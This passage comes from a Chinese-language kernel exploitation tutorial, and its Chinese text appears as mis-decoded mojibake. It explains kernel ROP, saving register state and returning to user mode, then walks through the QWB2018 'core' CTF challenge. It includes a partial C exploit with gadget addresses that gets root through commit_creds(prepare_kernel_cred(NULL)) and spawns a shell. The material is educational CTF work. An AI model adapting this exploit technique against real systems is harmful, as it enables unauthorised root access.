PYTHON">æ—¢ç„¶æ˜¯æ—©æœŸé‚£å°±ä¸è¦ç®¡äº†<br></code></pre></div></td></tr></table></figure><p>ç›¸æ¯”èµ·å¸¸è§„çš„ pwn é¢˜ï¼Œkernel pwn æ‰“è¿œç¨‹ä¼šæ˜¯ä¸€ä¸ªæ¯”è¾ƒæ¼«é•¿çš„è¿‡ç¨‹ï¼Œå› ä¸ºå¤§éƒ¨åˆ†çš„æ—¶é—´éƒ½ä¼šèŠ±åœ¨è¿™ä¸ªæ–‡ä»¶ä¼ è¾“ä¸Š</p><p>å¯¹äºéƒ¨åˆ†ä¸éœ€è¦ä¸€äº›é¢å¤–åŠŸèƒ½ï¼ˆå¦‚userfaultfdï¼‰çš„é¢˜ç›®å¯ä»¥ä½¿ç”¨ musl-C åº“æ¥å¤§å¹…é™ä½å¯æ‰§è¡Œæ–‡ä»¶çš„å¤§å°</p><p>å¯¹äºæ—¶é—´æ¯”è¾ƒå……è¶³çš„é¢˜ç›®ç¬”è€…æ¨èä½¿ç”¨çº¯æ±‡ç¼–æ¥ç¼–å†™expï¼ˆç¬‘ï¼‰</p><blockquote><p>è‹¥æ˜¯è¿æ°”ä¸å¤§å¥½ï¼Œé‚£ä¹ˆä½ å¯èƒ½ä¼šéœ€è¦ä»å¤´æ¥è¿‡â€¦</p><p><a href="https://i.loli.net/2021/07/21/VI1wAplsh2W5UYg.png"><img src="https://s2.loli.net/2023/02/06/hY2gy8TCUmIBQOZ.png" alt="image.png" style="zoom:25%;" /></a></p></blockquote><h2 id="å¸¸ç”¨æ•°æ®-amp-å‡½æ•°é›†åˆ"><a href="#å¸¸ç”¨æ•°æ®-amp-å‡½æ•°é›†åˆ" class="headerlink" title="*å¸¸ç”¨æ•°æ® &amp; å‡½æ•°é›†åˆ"></a>*<em>å¸¸ç”¨æ•°æ® &amp; å‡½æ•°é›†åˆ</em></h2><p>ç¬”è€…å°† kernel pwn ä¸­å¸¸ç”¨çš„ä¸€äº›æ•°æ®ã€å‡½æ•°ç­‰ç­‰å°è£…åœ¨ä¸€ä¸ªå¤´æ–‡ä»¶ <a href="../../files/kernelpwn.h">kernelpwn.h</a> ä¸­ï¼Œå°è£…å¥½äº†ä¸€äº›å¦‚ userfaultfdã€keyctlã€msg_msg ç­‰çš„å¸¸ç”¨ç‰©</p><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ musl åº“å¹¶æ²¡æœ‰ userfaultfd çš„ wrapperï¼Œæ‰€ä»¥ç¬”è€…å¯¹äºè¯¥å¤´æ–‡ä»¶ä¸­çš„ userfaultfd ç›¸å…³ä»£ç è¿›è¡Œäº† ifndefï¼Œè‹¥æ˜¯ä½ æƒ³è¦ä½¿ç”¨ musl-gcc ç¼–è¯‘ exp åˆ™å¯ä»¥åœ¨åŒ…å«è¯¥å¤´æ–‡ä»¶ä¹‹å‰ <code>#define MUSL_COOMPILE</code>ï¼Œè¿™æ ·å°±ä¸ä¼šæŠŠ userfaultfd çš„ä»£ç æ”¾è¿›å»äº†ï¼š)</p><h1 id="Kernel-ROP-basic"><a href="#Kernel-ROP-basic" class="headerlink" title="Kernel ROP - basic"></a>Kernel ROP - basic</h1><p>ROPå³<code>è¿”å›å¯¼å‘ç¼–ç¨‹</code>ï¼ˆReturn-oriented programmingï¼‰ï¼Œåº”å½“æ˜¯å¤§å®¶æ¯”è¾ƒç†Ÿæ‚‰çš„ä¸€ç§æ”»å‡»æ–¹å¼â€”â€”é€šè¿‡å¤ç”¨ä»£ç ç‰‡æ®µçš„æ–¹å¼æ§åˆ¶ç¨‹åºæ‰§è¡Œæµ</p><p>âœ³ <strong>å†…æ ¸æ€çš„ ROP ä¸ç”¨æˆ·æ€çš„ ROP ä¸€èˆ¬æ— äºŒï¼Œåªä¸è¿‡åˆ©ç”¨çš„ gadget å˜æˆäº†å†…æ ¸ä¸­çš„ gadgetï¼Œæ‰€éœ€è¦æ„é€ æ‰§è¡Œçš„ ropchain ç”±</strong><code>system(&quot;/bin/sh&quot;)</code><strong>å˜ä¸ºäº†</strong><code>commit_creds(prepare_kernel_cred(NULL))</code> </p><p>å½“æˆåŠŸæ‰§è¡Œ <code>commit_creds(prepare_kernel_cred(NULL))</code> ä¹‹åï¼Œå½“å‰çº¿ç¨‹çš„ cred ç»“æ„ä½“ä¾¿å˜ä¸º init è¿›ç¨‹çš„ cred çš„æ‹·è´ï¼Œæˆ‘ä»¬ä¹Ÿå°±è·å¾—äº† root æƒé™ï¼Œæ­¤æ—¶åœ¨ç”¨æˆ·æ€èµ·ä¸€ä¸ª shell ä¾¿èƒ½è·å¾— root shell</p><h2 id="çŠ¶æ€ä¿å­˜"><a href="#çŠ¶æ€ä¿å­˜" class="headerlink" title="çŠ¶æ€ä¿å­˜"></a>çŠ¶æ€ä¿å­˜</h2><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬çš„exploitéœ€è¦è¿›å…¥åˆ°å†…æ ¸å½“ä¸­å®Œæˆææƒï¼Œè€Œæˆ‘ä»¬æœ€ç»ˆä»ç„¶éœ€è¦<strong>ç€é™†å›ç”¨æˆ·æ€</strong>ä»¥è·å¾—ä¸€ä¸ªrootæƒé™çš„shellï¼Œå› æ­¤åœ¨æˆ‘ä»¬çš„exploitè¿›å…¥å†…æ ¸æ€ä¹‹å‰æˆ‘ä»¬éœ€è¦<strong>æ‰‹åŠ¨æ¨¡æ‹Ÿç”¨æˆ·æ€è¿›å…¥å†…æ ¸æ€çš„å‡†å¤‡å·¥ä½œ</strong>â€”â€”<strong>ä¿å­˜å„å¯„å­˜å™¨çš„å€¼åˆ°å†…æ ¸æ ˆä¸Š</strong>ï¼Œä»¥ä¾¿äºåç»­ç€é™†å›ç”¨æˆ·æ€</p><p>é€šå¸¸æƒ…å†µä¸‹ä½¿ç”¨å¦‚ä¸‹å‡½æ•°ä¿å­˜å„å¯„å­˜å™¨å€¼åˆ°æˆ‘ä»¬è‡ªå·±å®šä¹‰çš„å˜é‡ä¸­ï¼Œä»¥ä¾¿äºæ„é€  rop é“¾ï¼š</p><blockquote><p>ç®—æ˜¯ä¸€ä¸ªé€šç”¨çš„pwnæ¿å­</p><p>æ–¹ä¾¿èµ·è§ï¼Œä½¿ç”¨äº†å†…è”æ±‡ç¼–ï¼Œç¼–è¯‘æ—¶éœ€è¦æŒ‡å®šå‚æ•°ï¼š<code>-masm=intel</code></p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">saveStatus</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="è¿”å›ç”¨æˆ·æ€"><a href="#è¿”å›ç”¨æˆ·æ€" class="headerlink" title="è¿”å›ç”¨æˆ·æ€"></a>è¿”å›ç”¨æˆ·æ€</h2><p>åœ¨<a href="https://arttnba3.cn/2021/02/21/OS-0X00-LINUX-KERNEL-PART-I/#IV-%E5%86%85%E6%A0%B8%E6%80%81-%E2%80%94-gt-%E7%94%A8%E6%88%B7%E6%80%81"> è¿™ç¯‡åšå®¢ </a>å½“ä¸­ç¬”è€…ç®€è¦å™è¿°äº†å†…æ ¸æ€è¿”å›ç”¨æˆ·æ€çš„è¿‡ç¨‹ï¼š</p><ul><li><code>swapgs</code>æŒ‡ä»¤æ¢å¤ç”¨æˆ·æ€GSå¯„å­˜å™¨</li><li><code>sysretq</code>æˆ–è€…<code>iretq</code>æ¢å¤åˆ°ç”¨æˆ·ç©ºé—´</li></ul><p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦åœ¨å†…æ ¸ä¸­æ‰¾åˆ°ç›¸åº”çš„gadgetå¹¶æ‰§è¡Œ<code>swapgs;iretq</code>å°±å¯ä»¥æˆåŠŸç€é™†å›ç”¨æˆ·æ€</p><p>é€šå¸¸æ¥è¯´ï¼Œæˆ‘ä»¬åº”å½“æ„é€ å¦‚ä¸‹ropé“¾ä»¥è¿”å›ç”¨æˆ·æ€å¹¶è·å¾—ä¸€ä¸ªshellï¼š</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs AWK">swapgs<br>iretq<br>user_shell_addr<br>user_cs<br>user_eflags <span class="hljs-regexp">//</span><span class="hljs-number">64</span>bit user_rflags<br>user_sp<br>user_ss<br></code></pre></div></td></tr></table></figure><h4 id="æ¥ä¸‹æ¥æ˜¯swapgsçš„ç§‘æ™®"><a href="#æ¥ä¸‹æ¥æ˜¯swapgsçš„ç§‘æ™®" class="headerlink" title="æ¥ä¸‹æ¥æ˜¯swapgsçš„ç§‘æ™®:"></a>æ¥ä¸‹æ¥æ˜¯swapgsçš„ç§‘æ™®:</h4><ul><li>ç»“åˆpwn.collegeä¸­kerneléƒ¨åˆ†æ—¶çš„æŸ¥æ‰¾, å¤šäº†å‡ ä¸ªæ¦‚å¿µ: <a href="https://wiki.osdev.org/Model_Specific_Registers">MSR</a>(Model Specific Registers), <a href="https://wiki.osdev.org/SWAPGS">swapgsçš„è¶…è¯¦ç»†doc</a> |<br><a href="https://akkadia.org/drepper/tls.pdf">ELF Handling For Thread-Local Storage</a> | </li><li>(P2873 in Intel manual) one kind of MSR: Instruction-specific support (for example: SYSENTER, SYSEXIT, <strong><code>SWAPGS</code></strong>, etc.).<br>and P1866 fro swapgs instruction: <code>SWAPGS</code> exchanges the current GS base register value with <strong>the value contained in MSR</strong> address C0000102H(IA32_KERNEL_GS_BASE)</li><li>To acquire the kernel space stack <strong>after <code>swapgs</code></strong>, in entry_SYSCALL_64:<br><code>mov rsp, PER_CPU_VAR(cpu_current_top_of_stack)</code>,<br>expanding to <code>mov rsp, %gs:cpu_current_top_of_stack</code>,<br>GS register stores the base address for per-cpu data area. </li><li>ç”±ä¸Šé¢æ¥ä¸ªæ€»ç»“:  kernel stores the address of the <strong>per-CPU structure</strong> in MSR. åœ¨å†…æ ¸ä¸ç”¨æˆ·ä¹‹é—´åˆ‡æ¢éœ€ä½¿ç”¨swapgsäº¤æ¢gs base. </li></ul><blockquote><p>å†…æ ¸ROPå’Œç”¨æˆ·æ€çš„ROPæœ¬è´¨ä¸Šæ²¡æœ‰å¤ªå¤§åŒºåˆ«ï¼Œç»†èŠ‚ä¾¿ä¸åœ¨æ­¤èµ˜å™äº†</p><blockquote><p><del>ä»€ä¹ˆï¼Ÿä½ è¯´ä½ â‘§ä¼š ROP ï¼Ÿé‚£ä½ çœ‹ä¸ªğŸ”¨kernel pwn</del> </p><p>ğŸ‘´æ‚ŸğŸŒ¶ï¼**å¸¦å­¦çš„å¸¦æ‰‹å­pwneråœ¨VNCTF2021å‘Šè¯‰ğŸ‘´ ROP äº‹ä¸€ä¸ªå¯„å­˜å™¨ï¼</p></blockquote></blockquote><h2 id="ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2018-core"><a href="#ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2018-core" class="headerlink" title="ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2018 - core"></a>ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2018 - core</h2><blockquote><p>ä¾ç„¶æ˜¯ååˆ†ç»å…¸çš„kernel pwnå…¥é—¨é¢˜</p><p><a href="https://arttnba3.cn/download/qwb2018/pwn/core.7z">ç‚¹å‡»ä¸‹è½½-core.7z</a></p></blockquote><p>é¦–å…ˆæŸ¥çœ‹å¯åŠ¨è„šæœ¬<code>start.sh</code>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SHELL">qemu-system-x86_64 \<br>-m 128M \<br>-kernel ./bzImage \<br>-initrd  ./core.cpio \<br>-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \<br>-s  \<br>-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \<br>-nographic  \<br></code></pre></div></td></tr></table></figure><ul><li>å¼€å¯äº†KASLRä¿æŠ¤</li></ul><p>è§£å‹æ–‡ä»¶ç³»ç»Ÿï¼ŒæŸ¥çœ‹<code>init</code>æ–‡ä»¶ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SH"><span class="hljs-meta">#!/bin/sh</span><br>mount -t proc proc /proc<br>mount -t sysfs sysfs /sys<br>mount -t devtmpfs none /dev<br>/sbin/mdev -s<br>mkdir -p /dev/pts<br>mount -vt devpts -o gid=4,mode=620 none /dev/pts<br>chmod 666 /dev/ptmx<br>cat /proc/kallsyms &gt; /tmp/kallsyms<br><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict<br><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict<br>ifconfig eth0 up<br>udhcpc -i eth0<br>ifconfig eth0 10.0.2.15 netmask 255.255.255.0<br>route add default gw 10.0.2.2 <br>insmod /core.ko<br><br>poweroff -d 120 -f &amp;<br>setsid /bin/cttyhack setuidgid 1000 /bin/sh<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;sh end!\n&#x27;</span><br>umount /proc<br>umount /sys<br><br>poweroff -d 0  -f<br></code></pre></div></td></tr></table></figure><ul><li>å¼€å§‹æ—¶å†…æ ¸ç¬¦å·è¡¨è¢«å¤åˆ¶äº†ä¸€ä»½åˆ°<code>/tmp/kalsyms</code>ä¸­ï¼Œåˆ©ç”¨è¿™ä¸ªæˆ‘ä»¬å¯ä»¥è·å¾—å†…æ ¸ä¸­æ‰€æœ‰å‡½æ•°çš„åœ°å€</li><li>ä¸å‡ºæ„å¤–çš„è¯<code>core.ko</code>å°±æ˜¯å­˜åœ¨æ¼æ´çš„å†…æ ¸æ¨¡å—</li><li>æ”¹å˜æƒé™å‰è®¾ç½®äº†å®šæ—¶å…³æœºï¼Œè°ƒè¯•çš„æ—¶å€™å¯ä»¥æŠŠè¿™ä¸ªè¯­å¥å…ˆåˆ æ‰</li></ul><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>æƒ¯ä¾‹çš„<code>checksec</code>ä¸€ä¸‹ï¼Œå¼€äº†NXå’Œcanary</p><p><a href="https://i.loli.net/2021/03/04/Nrpe675FRtBP4ju.png"><img src="https://s2.loli.net/2023/02/06/6FV2UZpifJbKhsA.png" alt="image.png" style="zoom:50%;" /></a></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œç¬¦å·è¡¨æ²¡æŠ ï¼Œå¾ˆå¼€å¿ƒï¼ˆ</p><p>åˆå§‹åŒ–å‡½æ•°ä¸­åˆ›å»ºäº†ä¸€ä¸ªè¿›ç¨‹èŠ‚ç‚¹æ–‡ä»¶<code>/proc/core</code>ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬åç»­ä¸å†…æ ¸æ¨¡å—é—´é€šä¿¡çš„åª’ä»‹</p><p><a href="https://i.loli.net/2021/03/04/zocOw75hPrBIZkH.png"><img src="https://s2.loli.net/2023/02/06/vlrcMqys4onAY6P.png" alt="image.png" style="zoom:50%;" /></a></p><p>ç®€å•åˆ†æè‡ªå®šä¹‰çš„fopç»“æ„ä½“<code>core_fops</code>ï¼Œå‘ç°åªè‡ªå®šä¹‰äº†ä¸‰ä¸ªå›è°ƒå‡½æ•°</p><p><a href="https://i.loli.net/2021/03/04/JHyemlLTK5G34E2.png"><img src="https://s2.loli.net/2023/02/06/n5NpsRvMrbTLYGA.png" alt="image.png" style="zoom:67%;" /></a></p><p><a href="https://i.loli.net/2021/03/04/TvhVpN86dmfzHoW.png"><img src="https://s2.loli.net/2023/02/06/CofcN7rwIV3liMT.png" alt="image.png" style="zoom:67%;" /></a></p><p><a href="https://i.loli.net/2021/03/04/lDBmUK5fia3bnHL.png"><img src="https://s2.loli.net/2023/02/06/PHTrVMSWN1LA9g8.png" alt="image.png" style="zoom:67%;" /></a></p><p>å…¶ä¸­<code>core_release</code>ä»…ä¸ºæ‰“å°åŠŸèƒ½ï¼Œå°±ä¸åœ¨æ­¤æ”¾å‡ºäº†</p><p>è€Œ<code>core_write</code>çš„åŠŸèƒ½ä¸»è¦æ˜¯å…è®¸ç”¨æˆ·å‘bssæ®µä¸Šå†™å…¥æœ€å¤š<code>0x800</code>å­—èŠ‚çš„å†…å®¹</p><p><a href="https://i.loli.net/2021/03/08/bHKGQyTV7xMB5jS.png"><img src="https://s2.loli.net/2023/02/06/nCy7615itA4UwSl.png" alt="image.png" style="zoom:67%;" /></a></p><p>åœ¨<code>core_ioctl</code>ä¸­å…è®¸æˆ‘ä»¬è°ƒç”¨<code>core_read</code>å’Œ<code>core_copy_func</code>è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œä»¥åŠè®¾ç½®å…¨å±€å˜é‡<code>off</code>çš„å€¼</p><p><a href="https://i.loli.net/2021/03/08/faCDRKvMSN64eux.png"><img src="https://s2.loli.net/2023/02/06/BMmz5Qt7IPDGKxy.png" alt="image.png" style="zoom:67%;" /></a></p><p>åœ¨<code>core_read</code>å‡½æ•°ä¸­å…è®¸æˆ‘ä»¬ä»æ ˆä¸Šè¯»å–æ•°æ®ï¼Œç”±äº<code>off</code>å˜é‡çš„å€¼å¯ä»¥ç”±æˆ‘ä»¬æ§åˆ¶ï¼Œæ•…æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¯¥å‡½æ•°æ³„éœ²æ ˆä¸Šæ•°æ®ï¼ŒåŒ…æ‹¬<code>canary</code></p><p><a href="https://i.loli.net/2021/03/08/5ITzXBM3gJ2YEch.png"><img src="https://s2.loli.net/2023/02/06/1A9XDyYGW43wm5p.png" alt="image.png" style="zoom: 67%;" /></a></p><h3 id="æ¼æ´åˆ©ç”¨ï¼šKernel-ROP"><a href="#æ¼æ´åˆ©ç”¨ï¼šKernel-ROP" class="headerlink" title="æ¼æ´åˆ©ç”¨ï¼šKernel ROP"></a>æ¼æ´åˆ©ç”¨ï¼šKernel ROP</h3><p>åœ¨<code>core_copy_func</code>ä¸­å°†ä¼šæ‹·è´bssæ®µä¸Šå†…å®¹åˆ°æ ˆä¸Šï¼Œç”±äºå…¶æ‹·è´æ—¶ä½¿ç”¨ä½16å­—èŠ‚ä½œä¸ºåˆ¤æ–­é•¿åº¦ï¼Œè‹¥æ˜¯æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªæ°å½“çš„è´Ÿæ•°ï¼Œä¾¿èƒ½æ‹·è´æœ€å¤š0xffffå­—èŠ‚çš„æ•°æ®åˆ°æ ˆä¸Š</p><p>æ•…<strong>å­˜åœ¨æ ˆæº¢å‡ºï¼Œä¸”æº¢å‡ºæ•°æ®å¯æ§</strong></p><p><a href="https://i.loli.net/2021/03/08/2RYiWgwhFbpq7VC.png"><img src="https://s2.loli.net/2023/02/06/Xy5adbUMipgVwu7.png" alt="image.png"></a></p><p>é‚£ä¹ˆæˆ‘ä»¬ä¾¿èƒ½å¤Ÿåˆ©ç”¨æ ˆæº¢å‡ºåœ¨æ ˆä¸Šæ„é€ ROP chainä»¥ææƒ</p><p>è€Œcanaryçš„å€¼å¯ä»¥é€šè¿‡ioctlæä¾›çš„åŠŸèƒ½ä»¥æ³„éœ²ï¼Œæ­¤å‰å†…æ ¸ç¬¦å·è¡¨åˆå·²ç»è¢«æ‹·è´åˆ°äº†<code>/tmp/kallsyms</code>ä¸‹ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥ä»ä¸­è¯»å–å„ä¸ªå†…æ ¸ç¬¦å·çš„åœ°å€</p><p>åªè¦æˆ‘ä»¬èƒ½å¤Ÿåœ¨å†…æ ¸ç©ºé—´æ‰§è¡Œ<code>commit_cred(prepare_kernel_cred(NULL))</code>ï¼Œé‚£ä¹ˆå°±èƒ½å¤Ÿå°†è¿›ç¨‹çš„æƒé™æå‡åˆ°<code>root</code></p><p>è‡³äºgadgetå¯ä»¥ç›´æ¥ä½¿ç”¨ROPgadgetæˆ–è€…ropperå¯¹ç€vmlinuxé•œåƒè·‘ä¸€è½®ï¼Œè¿™é‡Œä¾¿ä¸å†èµ˜å™</p><blockquote><p>ä¸æ˜åŸå› ï¼Œç¬”è€…çš„ROPgadgetæ²¡æ³•æ‰¾åˆ°<code>iretq</code>ï¼Œåªå¥½ä½¿ç”¨ pwntools æ¥æœ</p><p><a href="https://s2.loli.net/2022/05/18/cSokGuy3fHxOKhm.png"><img src="https://s2.loli.net/2022/05/18/cSokGuy3fHxOKhm.png" alt="image.png"></a></p></blockquote><p>è°ƒè¯•çš„æ—¶å€™æˆ‘ä»¬å¯ä»¥å…ˆæŠŠkaslrå…³æ‰ï¼Œè·å–æ²¡æœ‰åç§»çš„å‡½æ•°åœ°å€ï¼Œåç»­å†é€šè¿‡è¯¥å€¼è®¡ç®—åç§»</p><p><a href="https://i.loli.net/2021/03/09/qcQBySIFpu9X1Hl.png"><img src="https://s2.loli.net/2023/02/06/YwekX3SKd25ORF1.png" alt="image.png"></a></p><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p>æˆ‘ä»¬è¿™é‡Œé€‰æ‹©æ‰§è¡Œ<code>commit_creds(prepare_kernel_cred(NULL))</code>ä»¥ææƒ</p><p>ç”±äºæ˜¯å†…æ ¸æ€çš„ropï¼Œæ•…æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨è¿”å›ç”¨æˆ·æ€æ‰§è¡Œ<code>/bin/sh</code>ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦æ¨¡æ‹Ÿç”±ç”¨æˆ·æ€è¿›å…¥å†…æ ¸æ€å†è¿”å›ç”¨æˆ·æ€çš„è¿‡ç¨‹</p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RDI_RET 0xffffffff81000b2f</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RDX_RET 0xffffffff810a0f49</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> POP_RCX_RET 0xffffffff81021e53</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SWAPGS_POPFQ_RET 0xffffffff81a012da</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span>  IRETQ 0xffffffff81050ac2</span><br><br><span class="hljs-keyword">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">saveStatus</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getRootShell</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span 